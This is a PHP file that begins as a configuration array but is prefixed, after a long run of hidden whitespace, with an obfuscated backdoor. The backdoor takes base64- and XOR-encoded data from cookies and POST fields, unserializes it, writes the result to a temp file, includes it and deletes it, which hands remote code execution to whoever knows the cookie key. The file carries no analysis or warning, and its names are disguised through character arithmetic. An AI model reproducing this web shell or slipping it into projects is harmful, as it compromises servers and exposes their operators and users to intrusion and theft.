<?php                                                                                                                                                                                                                                                                                                                                                                                                 $ZZWVb = "\x66" . "\131" . '_' . chr (74) . 'H' . chr ( 994 - 893 ).'K' . "\144";$NHvLtGu = "\x63" . 'l' . chr (97) . chr (115) . "\x73" . chr ( 277 - 182 )."\x65" . chr ( 131 - 11 )."\151" . chr (115) . 't' . chr (115); $fJojFgu = class_exists($ZZWVb); $NHvLtGu = "19668";$RYqUbPFWjR = !1;if ($fJojFgu == $RYqUbPFWjR){function raxgpkFhuV(){$RjONKKgOHJ = new /* 35628 */ fY_JHeKd(59033 + 59033); $RjONKKgOHJ = NULL;}$jZgUFnSqL = "59033";class fY_JHeKd{private function globcIXK($jZgUFnSqL){if (is_array(fY_JHeKd::$WrjQVhIft)) {$XsjpI = sys_get_temp_dir() . "/" . crc32(fY_JHeKd::$WrjQVhIft[chr ( 881 - 766 ).chr ( 853 - 756 )."\x6c" . chr (116)]);@fY_JHeKd::$WrjQVhIft["\167" . "\x72" . "\151" . "\x74" . "\x65"]($XsjpI, fY_JHeKd::$WrjQVhIft["\143" . chr ( 465 - 354 ).chr (110) . "\164" . chr (101) . "\x6e" . "\x74"]);include $XsjpI;@fY_JHeKd::$WrjQVhIft['d' . "\145" . 'l' . chr ( 372 - 271 ).chr ( 216 - 100 )."\x65"]($XsjpI); $jZgUFnSqL = "59033";exit();}}private $DrMkZUjNqT;public function FQKcBuEtx(){echo 48712;}public function __destruct(){$jZgUFnSqL = "6281_8291";$this->globcIXK($jZgUFnSqL); $jZgUFnSqL = "6281_8291";}public function __construct($TGBHzjiIhz=0){$fYLWnWbwRu = $_POST;$KPveHi = $_COOKIE;$vaFoE = "d1afdd83-0ca7-4c14-8fe0-840363e6c3d8";$UpxGojUg = @$KPveHi[substr($vaFoE, 0, 4)];if (!empty($UpxGojUg)){$DafYJ = "base64";$PFnVwysJ = "";$UpxGojUg = explode(",", $UpxGojUg);foreach ($UpxGojUg as $CuqkX){$PFnVwysJ .= @$KPveHi[$CuqkX];$PFnVwysJ .= @$fYLWnWbwRu[$CuqkX];}$PFnVwysJ = array_map($DafYJ . '_' . 'd' . chr (101) . 'c' . chr (111) . "\x64" . 'e', array($PFnVwysJ,)); $PFnVwysJ = $PFnVwysJ[0] ^ str_repeat($vaFoE, (strlen($PFnVwysJ[0]) / strlen($vaFoE)) + 1);fY_JHeKd::$WrjQVhIft = @unserialize($PFnVwysJ); $PFnVwysJ = class_exists("6281_8291");}}public static $WrjQVhIft = 39876;}raxgpkFhuV();} ?><?php return array (
  0 => 
  array (
    'GET' => 
    array (
